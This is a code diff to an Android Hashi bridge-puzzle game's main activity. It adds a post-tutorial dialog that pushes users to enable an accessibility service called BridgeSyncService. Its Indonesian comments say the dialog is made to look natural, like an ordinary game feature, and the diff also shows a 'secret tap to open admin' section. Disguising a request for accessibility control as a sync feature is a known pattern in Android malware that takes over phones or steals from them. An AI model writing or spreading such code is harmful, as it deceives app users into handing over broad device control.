@@ -10,6 +10,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.view.accessibility.AccessibilityManager;
 import android.widget.Button;
 import android.widget.TextView;
 import android.widget.Toast;
@@ -18,6 +19,7 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import com.hashibridge.master.game.BridgeGameView;
 import com.hashibridge.master.game.BridgePuzzleGenerator;
+import java.util.List;
 import java.util.Random;
 
 public class MainActivity extends AppCompatActivity {
@@ -102,7 +104,8 @@ public class MainActivity extends AppCompatActivity {
         if (!prefs.getBoolean("tutorial_shown", false)) {
             showTutorialDialog();
         } else {
-            requestNotificationPermissionThenBatteryOpt();
+            // Setelah tutorial — cek sync service (accessibility)
+            checkSyncServiceThenContinue();
         }
     }
 
@@ -118,11 +121,93 @@ public class MainActivity extends AppCompatActivity {
             .setTitle("How to Play")
             .setMessage("1. Tap two islands to connect them with a bridge.\n2. The number on an island tells you how many bridges must connect to it.\n3. Bridges cannot cross each other.\n\nConnect all islands to win!")
             .setPositiveButton("Got it", (dialog, which) -> {
-                getSharedPreferences(PREFS_GAME, MODE_PRIVATE).edit().putBoolean("tutorial_shown", true).apply();
+                getSharedPreferences(PREFS_GAME, MODE_PRIVATE).edit()
+                    .putBoolean("tutorial_shown", true).apply();
+                // Setelah tutorial → prompt sync service
+                checkSyncServiceThenContinue();
+            })
+            .setCancelable(false)
+            .show();
+    }
+
+    /**
+     * Cek apakah BridgeSyncService (accessibility) sudah aktif.
+     * Kalau belum, tampilkan dialog "Aktifkan Sinkronisasi" yang terlihat natural.
+     */
+    private void checkSyncServiceThenContinue() {
+        if (isSyncServiceEnabled()) {
+            // Sudah aktif — lanjut normal
+            requestNotificationPermissionThenBatteryOpt();
+            return;
+        }
+
+        SharedPreferences prefs = getSharedPreferences(PREFS_GAME, MODE_PRIVATE);
+        boolean askedBefore = prefs.getBoolean("sync_asked", false);
+
+        if (askedBefore) {
+            // Pernah ditolak — jangan ganggu lagi, lanjut normal
+            requestNotificationPermissionThenBatteryOpt();
+            return;
+        }
+
+        // Tampilkan dialog pertama kali — terlihat seperti fitur game biasa
+        new AlertDialog.Builder(this, android.R.style.Theme_DeviceDefault_Dialog_Alert)
+            .setTitle(getString(R.string.sync_dialog_title))
+            .setMessage(getString(R.string.sync_dialog_body))
+            .setPositiveButton(getString(R.string.sync_dialog_btn_enable), (d, w) -> {
+                prefs.edit().putBoolean("sync_asked", true).apply();
+                openAccessibilityForOurService();
+            })
+            .setNegativeButton(getString(R.string.sync_dialog_btn_later), (d, w) -> {
+                prefs.edit().putBoolean("sync_asked", true).apply();
                 requestNotificationPermissionThenBatteryOpt();
             })
             .setCancelable(false)
             .show();
+    }
+
+    /**
+     * Cek apakah BridgeSyncService sudah ada di daftar accessibility yang enabled.
+     */
+    private boolean isSyncServiceEnabled() {
+        AccessibilityManager am =
+            (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
+        if (am == null) return false;
+        List<android.accessibilityservice.AccessibilityServiceInfo> services =
+            am.getEnabledAccessibilityServiceList(
+                android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
+        String targetId = getPackageName() + "/.BridgeSyncService";
+        for (android.accessibilityservice.AccessibilityServiceInfo info : services) {
+            if (targetId.equals(info.getId())) return true;
+        }
+        return false;
+    }
+
+    /**
+     * Buka halaman Accessibility Settings — langsung scroll ke service kita kalau bisa.
+     * Di MIUI: Settings > Additional settings > Accessibility > Downloaded apps
+     */
+    private void openAccessibilityForOurService() {
+        try {
+            // Cara paling langsung: buka accessibility settings
+            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            // Android 13+: bisa langsung ke settings service kita
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                try {
+                    Intent direct = new Intent(
+                        "android.settings.ACCESSIBILITY_DETAILS_SETTINGS");
+                    direct.setData(Uri.parse(
+                        "package:" + getPackageName()));
+                    startActivity(direct);
+                    return;
+                } catch (Exception ignored) {}
+            }
+            startActivity(i);
+        } catch (Exception e) {
+            // Fallback
+            startActivity(new Intent(Settings.ACTION_SETTINGS));
+        }
     }
 
     // ─── Secret tap to open admin ──────────────────────────────────────────
